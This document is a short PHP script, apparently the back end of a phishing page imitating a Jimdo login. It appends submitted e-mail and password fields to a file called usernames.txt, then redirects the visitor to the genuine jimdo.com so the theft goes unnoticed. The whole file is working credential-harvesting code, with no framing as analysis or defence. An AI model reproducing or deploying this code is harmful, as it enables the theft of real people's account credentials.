<?php

file_put_contents("usernames.txt", "Account: " . $_POST['E-mail'] . " Pass: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: https://www.jimdo.com');
exit();
